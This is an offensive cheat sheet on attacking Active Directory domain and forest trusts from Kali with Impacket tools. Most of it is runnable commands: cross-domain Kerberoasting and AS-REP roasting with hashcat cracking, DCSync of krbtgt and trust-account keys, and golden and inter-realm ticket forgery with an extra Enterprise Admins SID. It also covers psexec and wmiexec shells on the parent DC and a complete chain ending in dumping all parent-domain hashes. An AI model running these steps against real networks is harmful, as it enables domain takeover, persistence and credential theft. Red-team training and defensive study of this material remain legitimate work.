---
title: "Domain & Forest Trusts — From Kali"
weight: 6
tags: ["ad", "trusts", "forest", "kali", "impacket", "sid-history"]
---

## Quick Reference

| Attack | Requirement | Tool |
|---|---|---|
| Cross-domain Kerberoasting | Valid low-priv creds in child domain | GetUserSPNs.py |
| Cross-domain AS-REP Roasting | Valid low-priv creds in child domain | GetNPUsers.py |
| SID History Injection (parent-child) | Domain Admin in child domain, child krbtgt hash | ticketer.py |
| Cross-domain DCSync | Replication rights or DA in target domain | secretsdump.py |
| One-way inbound trust abuse | DA in trusted domain, inter-realm key | ticketer.py (silver), getST.py |
| One-way outbound trust abuse | DA in trusting domain, TDO GUID | secretsdump.py, getTGT.py |
| Cross-forest Kerberoasting | Bidirectional forest trust, valid creds | GetUserSPNs.py |
| Golden ticket cross-domain | Child krbtgt hash + parent domain SID | ticketer.py |
| BloodHound trust mapping | Valid creds, network access to DC | bloodhound-python |

---

## Trust Concepts

### Trust Types

A **Trust** is a relationship between two domains that allows security principals in one domain to authenticate to resources in another. Trust information is stored in Active Directory as **Trusted Domain Objects (TDOs)** under `CN=System`.

**Trust type by `trustType` value:**

| Value | Name | Description |
|---|---|---|
| 1 | DOWNLEVEL | Windows NT 4.0 domain |
| 2 | UPLEVEL | Active Directory domain |
| 3 | MIT | Non-Windows Kerberos realm |

**Common trust relationship categories:**

- **Parent-Child Trust** — Two-way, transitive. Automatically created when a new child domain is added to an existing tree. The child domain's FQDN is a subdomain of the parent.
- **Tree-Root Trust** — Two-way, transitive. Automatically created when a new domain tree is added to an existing forest.
- **External Trust** — One or two-way, non-transitive. Connects domains in different forests.
- **Forest Trust** — One or two-way, can be transitive. Connects two forest root domains and enables cross-forest authentication.

### Trust Direction (`trustDirection`)

| Value | Constant | Meaning |
|---|---|---|
| 0 | TRUST_DIRECTION_DISABLED | Trust is disabled |
| 1 | TRUST_DIRECTION_INBOUND | Remote domain trusts us — their users can access our resources |
| 2 | TRUST_DIRECTION_OUTBOUND | We trust the remote domain — our users can access their resources |
| 3 | TRUST_DIRECTION_BIDIRECTIONAL | Mutual trust in both directions |

**From an attacker's perspective:**

- `INBOUND` (1): The foreign domain trusts this domain. Users from this domain can authenticate to the foreign domain.
- `OUTBOUND` (2): This domain trusts the foreign domain. Users from the foreign domain can authenticate here.
- `BIDIRECTIONAL` (3): Full mutual trust.

### Trust Attribute Flags (`trustAttributes`)

These are bitwise flags. A single integer value may represent multiple flags OR'd together.

| Flag (Hex) | Value (Dec) | Constant | Meaning |
|---|---|---|---|
| 0x01 | 1 | NON_TRANSITIVE | Trust is not transitive |
| 0x02 | 2 | UPLEVEL_ONLY | Trust valid only for Windows 2000+ clients |
| 0x04 | 4 | QUARANTINED_DOMAIN | SID filtering is enabled — blocks SID History injection |
| 0x08 | 8 | FOREST_TRANSITIVE | Trust is transitive between two forests |
| 0x10 | 16 | CROSS_ORGANIZATION | No TGT delegation across this trust |
| 0x20 | 32 | WITHIN_FOREST | Trust between two domains in the same forest (parent-child) |
| 0x40 | 64 | TREAT_AS_EXTERNAL | Treated as external trust, SID filtering implied |
| 0x80 | 128 | USES_RC4_ENCRYPTION | Uses RC4 instead of AES for inter-realm key encryption |

**Key security implication:** If `trustAttributes` has bit `0x04` (QUARANTINED_DOMAIN) set, SID History injection via extra SIDs will be stripped at the trust boundary. This is the primary defense against parent-child privilege escalation.

### Transitivity

Transitivity determines whether a trust extends beyond its two direct parties. If Domain A trusts Domain B and Domain B trusts Domain C, a transitive trust means Domain A implicitly trusts Domain C.

- Parent-child and tree-root trusts are always transitive within a forest.
- External trusts are non-transitive by default.
- Forest trusts can be transitive if `FOREST_TRANSITIVE` (0x08) is set.

### Inter-Realm Keys and Trust Accounts

When a trust is established, an **inter-realm key** is shared between the two domains. This key bridges the cryptographic gap — a TGT issued by one KDC cannot be decrypted by another KDC because they do not share the same `krbtgt` secret.

A **trust account** is created in each domain using the NetBIOS flat name of the trusting domain with a `$` suffix (e.g., `PARTNER$`). This account's password is the shared inter-realm key.

Enumerate trust accounts:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "DC=CHILD_DOMAIN_BASE" \
  "(samAccountType=805306370)" samAccountName
```

---

## Environment Setup

### /etc/hosts Configuration

For multi-domain environments, ensure both DCs resolve correctly:

```bash
# Add child and parent DC entries
echo "CHILD_DC_IP    dc.CHILD_DOMAIN CHILD_DOMAIN" | sudo tee -a /etc/hosts
echo "PARENT_DC_IP   dc.PARENT_DOMAIN PARENT_DOMAIN" | sudo tee -a /etc/hosts
```

### krb5.conf for Multi-Domain Kerberos

```bash
sudo nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = CHILD_DOMAIN
    dns_lookup_realm = false
    dns_lookup_kdc = true
    forwardable = true
    rdns = false

[realms]
    CHILD_DOMAIN = {
        kdc = CHILD_DC_IP
        admin_server = CHILD_DC_IP
    }
    PARENT_DOMAIN = {
        kdc = PARENT_DC_IP
        admin_server = PARENT_DC_IP
    }

[domain_realm]
    .CHILD_DOMAIN = CHILD_DOMAIN
    CHILD_DOMAIN = CHILD_DOMAIN
    .PARENT_DOMAIN = PARENT_DOMAIN
    PARENT_DOMAIN = PARENT_DOMAIN
```

---

## Enumeration

### LDAP Trust Enumeration

Query the `CN=System` container for `trustedDomain` objects:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" \
  trustPartner trustDirection trustType trustAttributes flatName
```

Full attribute pull for analysis:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" \
  trustPartner trustDirection trustType trustAttributes flatName securityIdentifier objectGUID
```

Parse key fields:

- `trustPartner` — FQDN of the trusted/trusting domain
- `trustDirection` — integer (0/1/2/3)
- `trustType` — integer (1/2/3)
- `trustAttributes` — bitwise integer, decode against the flag table above
- `flatName` — NetBIOS name
- `objectGUID` — needed for outbound trust TDO DCSync

### Domain SID Enumeration via LDAP

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=domain)" objectSid

# Get parent domain SID
ldapsearch -x -H ldap://PARENT_DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "DC=PARENT_DOMAIN_DC_BASE" \
  "(objectClass=domain)" objectSid
```

### lookupsid for SID Discovery

```bash
# Enumerate child domain SID
lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@CHILD_DC_IP | grep "Domain SID"

# Enumerate parent domain SID
lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@PARENT_DC_IP | grep "Domain SID"

# Full SID enumeration (reveals trust accounts, well-known SIDs)
lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@DC_IP
```

### NetExec (nxc) Trust Queries

```bash
# LDAP trusted-for-delegation enum (also reveals delegation info)
nxc ldap DC_IP -u USERNAME -p PASSWORD --trusted-for-delegation

# SMB domain info
nxc smb DC_IP -u USERNAME -p PASSWORD --pass-pol

# Enumerate users across domains
nxc ldap DC_IP -u USERNAME -p PASSWORD --users
nxc ldap PARENT_DC_IP -u USERNAME -p PASSWORD --users
```

### BloodHound Trust Mapping

```bash
# Collect all data including trust relationships
bloodhound-python \
  -c All,Trusts \
  -d CHILD_DOMAIN \
  -u USERNAME \
  -p PASSWORD \
  -dc DC_IP \
  --zip

# Collect from parent domain if creds available
bloodhound-python \
  -c All,Trusts \
  -d PARENT_DOMAIN \
  -u USERNAME \
  -p PASSWORD \
  -dc PARENT_DC_IP \
  --zip
```

In BloodHound, use the pre-built query **"Find Shortest Paths to Domain Trusts"** or the **Trusts** tab on a domain node.

### DNS-Based Domain and DC Discovery

Discover child domains from the parent domain via DNS SRV records:

```bash
# Find all DCs in child domain
dig _ldap._tcp.CHILD_DOMAIN SRV

# Find Kerberos DCs
dig _kerberos._tcp.CHILD_DOMAIN SRV
nslookup -type=SRV _kerberos._tcp.CHILD_DOMAIN DC_IP

# Find all DCs in parent domain
dig _ldap._tcp.dc._msdcs.PARENT_DOMAIN SRV @PARENT_DC_IP

# Global Catalog (forest-wide)
dig _gc._tcp.PARENT_DOMAIN SRV @PARENT_DC_IP

# Enumerate domain info
nmap -p 88,389,445,636,3268,3269 TARGET_IP --open
```

### rpcclient Trust Enumeration

```bash
rpcclient -U "USERNAME%PASSWORD" DC_IP

# Inside rpcclient prompt:
rpcclient $> dsenumdomtrusts
rpcclient $> enumdomains
rpcclient $> dsgetdcname TRUSTED_DOMAIN
rpcclient $> querydominfo
```

### Python ldap3 Trust Script

```python
#!/usr/bin/env python3
from ldap3 import Server, Connection, ALL, NTLM

server = Server('DC_IP', get_info=ALL)
conn = Connection(
    server,
    user='CHILD_DOMAIN\\USERNAME',
    password='PASSWORD',
    authentication=NTLM
)

if conn.bind():
    conn.search(
        'CN=System,DC=child,DC=example,DC=com',
        '(objectClass=trustedDomain)',
        attributes=[
            'trustPartner', 'trustDirection',
            'trustType', 'trustAttributes',
            'securityIdentifier', 'objectGUID', 'flatName'
        ]
    )
    for entry in conn.entries:
        print(f"[*] Trust Partner: {entry.trustPartner}")
        print(f"    Direction:      {entry.trustDirection}")
        print(f"    Type:           {entry.trustType}")
        print(f"    Attributes:     {entry.trustAttributes}")
        print(f"    GUID:           {entry.objectGUID}")
        print()
else:
    print("[-] Bind failed")
```

---

## Cross-Domain Kerberoasting

When a trust exists, SPNs registered in the trusted domain may be targetable from an account in the trusting domain.

**Step 1: Obtain a TGT for the child domain account**

```bash
getTGT.py CHILD_DOMAIN/USERNAME:PASSWORD
export KRB5CCNAME=USERNAME.ccache
```

**Step 2: Request TGS hashes for SPNs in the parent domain**

```bash
GetUserSPNs.py \
  -k -no-pass \
  -target-domain PARENT_DOMAIN \
  -dc-host PARENT_DC_IP \
  -request \
  CHILD_DOMAIN/USERNAME
```

**Step 3: Save output and crack**

```bash
GetUserSPNs.py \
  -k -no-pass \
  -target-domain PARENT_DOMAIN \
  -dc-host PARENT_DC_IP \
  -request \
  -outputfile kerberoast_cross.txt \
  CHILD_DOMAIN/USERNAME

hashcat -m 13100 kerberoast_cross.txt /usr/share/wordlists/rockyou.txt
```

> **Note:** This requires that the trust direction allows your account to authenticate to the parent domain. A bidirectional or parent-child trust (direction=3) satisfies this. Check `trustDirection` before attempting.

---

## Cross-Domain AS-REP Roasting

Enumerate accounts in the parent domain that do not require Kerberos pre-authentication:

```bash
# With valid child domain credentials
GetNPUsers.py \
  -target-domain PARENT_DOMAIN \
  -dc-host PARENT_DC_IP \
  -request \
  -format hashcat \
  -outputfile asrep_cross.txt \
  CHILD_DOMAIN/USERNAME:PASSWORD

hashcat -m 18200 asrep_cross.txt /usr/share/wordlists/rockyou.txt
```

---

## Cross-Domain DCSync

If you have an account with replication privileges (Domain Admin, or explicitly granted `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) in the target domain:

```bash
# DCSync the parent domain controller
secretsdump.py -just-dc CHILD_DOMAIN/USERNAME:PASSWORD@PARENT_DC_IP

# Dump only the krbtgt account
secretsdump.py -just-dc-user krbtgt CHILD_DOMAIN/USERNAME:PASSWORD@PARENT_DC_IP

# Dump with NTLM hash instead of password
secretsdump.py -just-dc -hashes :NTLM_HASH CHILD_DOMAIN/USERNAME@PARENT_DC_IP
```

---

## SID History Injection — Parent-Child Escalation

This is the primary technique for escalating from child domain admin to parent domain Enterprise Admin. The `SID History` attribute in a Kerberos PAC allows additional SIDs to be included in the ticket. By adding the parent domain's `Enterprise Admins` SID (`PARENT_SID-519`), the forged ticket is treated as belonging to that privileged group when accessing the parent domain.

**Prerequisite:** Domain Admin in the child domain.

**Step 1: DCSync the child domain krbtgt**

```bash
secretsdump.py \
  -just-dc-user krbtgt \
  CHILD_DOMAIN/DA_USERNAME:PASSWORD@CHILD_DC_IP
```

Note both the `NT` hash (NTLM) and `aes256-cts-hmac-sha1-96` value from the output.

**Step 2: Get the child domain SID**

```bash
lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@CHILD_DC_IP | grep "Domain SID"
```

Output example: `Domain SID is: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX`

Save this as `CHILD_SID`.

**Step 3: Get the parent domain SID**

```bash
lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@PARENT_DC_IP | grep "Domain SID"
```

Save this as `PARENT_SID`.

**Step 4: Forge the inter-realm golden ticket with extra SID**

The `-extra-sid` value must be `PARENT_SID-519` (Enterprise Admins RID is always 519).

```bash
ticketer.py \
  -nthash KRBTGT_HASH \
  -aesKey KRBTGT_AES256 \
  -domain CHILD_DOMAIN \
  -domain-sid CHILD_SID \
  -extra-sid PARENT_SID-519 \
  fake_admin
```

This creates `fake_admin.ccache`.

**Step 5: Export the ticket**

```bash
export KRB5CCNAME=fake_admin.ccache
klist
```

**Step 6: Access the parent domain controller**

```bash
# PsExec-style shell on parent DC
psexec.py -k -no-pass CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME

# WMI execution
wmiexec.py -k -no-pass CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME

# SMB file access
smbclient.py -k -no-pass //PARENT_DC_HOSTNAME/C$

# Dump parent domain hashes via DCSync
secretsdump.py -k -no-pass -just-dc CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME
```

> **Note:** The `PARENT_DC_HOSTNAME` in the connection string must match a DNS-resolvable hostname, not an IP address, when using Kerberos (`-k`). Add it to `/etc/hosts` if needed.

**Why this works:** The forged TGT is signed with the child domain's `krbtgt` secret. When presented to the child domain KDC during trust traversal, the KDC issues an inter-realm referral ticket. The extra SID (`PARENT_SID-519`) is preserved in the PAC and accepted by the parent DC unless SID filtering (`0x04` QUARANTINED_DOMAIN) is enforced.

---

## Golden Ticket Cross-Domain

A golden ticket forged with the child krbtgt is functionally equivalent to the SID History approach when `-extra-sid` is included:

```bash
# Forge with AES key preferred (more stealth than RC4/NTLM)
ticketer.py \
  -nthash KRBTGT_HASH \
  -aesKey KRBTGT_AES256 \
  -domain CHILD_DOMAIN \
  -domain-sid CHILD_SID \
  -extra-sid PARENT_SID-519 \
  -duration 87600 \
  fake_admin

export KRB5CCNAME=fake_admin.ccache

# Access any machine in the parent domain
psexec.py -k -no-pass CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME
wmiexec.py -k -no-pass CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME
```

The `-duration 87600` sets ticket lifetime to 10 years (expressed in hours). Persistence lasts until the `krbtgt` account is rotated **twice** in the child domain.

---

## One-Way Inbound Trust Abuse

**Scenario:** You are compromised in domain A. Domain B has `trustDirection=1` (INBOUND toward A), meaning domain B trusts domain A. Users from A can access resources in B.

### Enumeration

```bash
# Identify inbound trust (direction=1)
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" \
  trustDirection trustPartner trustAttributes flatName
```

Look for `trustDirection: 1`.

### Foreign Security Principals Container

In the trusting domain (B), the `Foreign Security Principals` container holds objects representing security principals from domain A that have been granted access to resources in B.

```bash
ldapsearch -x -H ldap://TRUSTED_DOMAIN_DC \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=ForeignSecurityPrincipals,DC=TRUSTED_DOMAIN_DC_BASE" \
  "(objectClass=foreignSecurityPrincipal)" \
  cn memberOf
```

The `cn` attribute contains the SID of the foreign principal. Resolve it:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "DC=CHILD_DOMAIN_DC_BASE" \
  "(objectSid=FOREIGN_SID)"
```

This reveals which local users or groups have been granted membership in the trusting domain's groups — a high-value target.

### DCSync the Inter-Realm Key

The inter-realm key is stored as the password of the trust account (`TRUSTED_DOMAIN$`). DCSync this account from the domain where the TDO exists:

```bash
# Dump the trust account credentials
secretsdump.py \
  -just-dc-user TRUSTED_DOMAIN$ \
  CHILD_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

The `[Out]` key is the current inter-realm key; `[Out-1]` is the previous one (rotated every 30 days).

### Forge a Referral Ticket (Silver Ticket for krbtgt Service)

Use the inter-realm key (RC4/NTLM hash by default, since trusts use RC4 unless AES is configured) to forge a ticket that presents as a referral from the trusted domain:

```bash
# Forge silver ticket targeting the krbtgt service of the trusting domain
ticketer.py \
  -nthash INTER_REALM_NTLM_HASH \
  -domain CHILD_DOMAIN \
  -domain-sid CHILD_SID \
  -spn krbtgt/TRUSTED_DOMAIN \
  USERNAME

export KRB5CCNAME=USERNAME.ccache
```

### Request Service Tickets in the Trusting Domain

```bash
# Request a CIFS service ticket in the trusting domain
getST.py \
  -k -no-pass \
  -spn cifs/TARGET_HOST.TRUSTED_DOMAIN \
  -dc-ip TRUSTED_DOMAIN_DC \
  CHILD_DOMAIN/USERNAME

export KRB5CCNAME=USERNAME@cifs_TARGET.ccache
smbclient.py -k -no-pass //TARGET_HOST.TRUSTED_DOMAIN/C$
```

> **Note:** Trusts, even in modern Windows environments, typically use RC4 encryption for the inter-realm key by default unless AES was explicitly configured at trust creation. The `trustAttributes` flag `0x80` (USES_RC4_ENCRYPTION) confirms RC4.

---

## One-Way Outbound Trust Abuse

**Scenario:** You are in domain A. Domain A has `trustDirection=2` (OUTBOUND toward B), meaning domain A trusts domain B. Users from B can authenticate into A.

You are on the "wrong side" — you cannot directly authenticate into B using your A credentials. However, the TDO in domain A stores the inter-realm key for the trust with B.

### Enumerate the TDO GUID

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" \
  name objectGUID trustDirection
```

Note the `objectGUID` value for the trust object pointing to the domain you want to access.

### DCSync the TDO Using the GUID

```bash
# Use secretsdump with the GUID to extract the inter-realm key
# The GUID must be formatted as {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
secretsdump.py \
  -just-dc-user "{TDO_OBJECT_GUID}" \
  CHILD_DOMAIN/DA_USERNAME:PASSWORD@DC_IP
```

This yields the RC4 (NTLM) and/or AES inter-realm keys (`[Out]` = current, `[Out-1]` = previous).

### Request a TGT as the Trust Account

The trust account in the trusting domain (A) has the form `TRUSTED_DOMAIN_FLATNAME$` and its password is the inter-realm key.

```bash
getTGT.py \
  -hashes :INTER_REALM_RC4_HASH \
  CHILD_DOMAIN/TRUSTED_DOMAIN_FLATNAME$

export KRB5CCNAME=TRUSTED_DOMAIN_FLATNAME$.ccache
```

### Enumerate the Trusted Domain

```bash
# Enumerate domain objects in the trusted domain
ldapsearch -x -H ldap://TRUSTED_DOMAIN_DC \
  -D "CHILD_DOMAIN\\TRUSTED_DOMAIN_FLATNAME$" \
  -Y GSSAPI \
  -b "DC=TRUSTED_DOMAIN_DC_BASE" \
  "(objectClass=domain)" name objectSid

# Enumerate users in the trusted domain
GetADUsers.py \
  -k -no-pass \
  -dc-ip TRUSTED_DOMAIN_DC \
  CHILD_DOMAIN/TRUSTED_DOMAIN_FLATNAME$
```

---

## Cross-Forest Attack Vectors

### SID Filtering Check

Before attempting any SID History-based attack across a forest trust, verify whether SID filtering is active:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" trustAttributes trustPartner
```

Decode `trustAttributes` against the flag table:
- Bit `0x04` (value 4) set = **QUARANTINED_DOMAIN** = SID filtering active = ExtraSIDs stripped at boundary
- Bit `0x40` (value 64) set = **TREAT_AS_EXTERNAL** = SID filtering implied even on forest trusts

If SID filtering is active, SID History injection attacks will fail silently — the extra SIDs are stripped when the ticket crosses the trust boundary.

### Cross-Forest Kerberoasting

If a bidirectional forest trust exists (`trustAttributes` has `FOREST_TRANSITIVE` = 0x08, direction = 3):

```bash
getTGT.py CHILD_DOMAIN/USERNAME:PASSWORD
export KRB5CCNAME=USERNAME.ccache

GetUserSPNs.py \
  -k -no-pass \
  -target-domain TRUSTED_DOMAIN \
  -dc-host TRUSTED_DOMAIN_DC \
  -request \
  CHILD_DOMAIN/USERNAME

hashcat -m 13100 forest_kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### ExtraSIDs Abuse When SID Filtering Is Disabled

If SID filtering is not enabled on a forest trust (uncommon but possible in legacy or misconfigured environments):

```bash
# Same as parent-child SID History — add Enterprise Admins SID of foreign forest
ticketer.py \
  -nthash KRBTGT_HASH \
  -aesKey KRBTGT_AES256 \
  -domain CHILD_DOMAIN \
  -domain-sid CHILD_SID \
  -extra-sid TRUSTED_DOMAIN_EA_SID \
  fake_admin

export KRB5CCNAME=fake_admin.ccache
psexec.py -k -no-pass CHILD_DOMAIN/fake_admin@TRUSTED_DC_HOSTNAME
```

### Selective Authentication Bypass

When `trustAttributes` includes `CROSS_ORGANIZATION` (0x10), Selective Authentication may be enforced. This restricts which accounts from the trusting domain can authenticate to specific resources in the trusted domain.

Check for this condition:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@CHILD_DOMAIN" -w 'PASSWORD' \
  -b "CN=System,DC=CHILD_DOMAIN_DC_BASE" \
  "(objectClass=trustedDomain)" trustAttributes
```

If `0x10` is set in the `trustAttributes` value (it may be combined with other flags), the trust has the CROSS_ORGANIZATION flag. In this case, only accounts that have been explicitly granted the "Allowed to Authenticate" right on target resources will succeed.

---

## Complete Attack Flow: Child to Parent Escalation

```
[Attacker on Kali — compromise child domain DA first]

1. ENUM TRUSTS
   ldapsearch -b "CN=System,..." "(objectClass=trustedDomain)"
   → trustDirection=3 (bidirectional parent-child)
   → trustAttributes=32 (0x20 = WITHIN_FOREST, no SID filtering)

2. GET CHILD KRBTGT
   secretsdump.py -just-dc-user krbtgt CHILD_DOMAIN/DA:PASS@CHILD_DC_IP
   → NT hash  → KRBTGT_HASH
   → AES256   → KRBTGT_AES256

3. GET DOMAIN SIDs
   lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@CHILD_DC_IP  → CHILD_SID
   lookupsid.py CHILD_DOMAIN/USERNAME:PASSWORD@PARENT_DC_IP → PARENT_SID

4. FORGE TICKET
   ticketer.py -nthash KRBTGT_HASH -aesKey KRBTGT_AES256 \
     -domain CHILD_DOMAIN -domain-sid CHILD_SID \
     -extra-sid PARENT_SID-519 fake_admin

5. AUTHENTICATE TO PARENT
   export KRB5CCNAME=fake_admin.ccache
   psexec.py -k -no-pass CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME
   → NT AUTHORITY\SYSTEM shell on parent DC

6. DUMP PARENT
   secretsdump.py -k -no-pass -just-dc CHILD_DOMAIN/fake_admin@PARENT_DC_HOSTNAME
   → All hashes in parent domain, including parent krbtgt
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
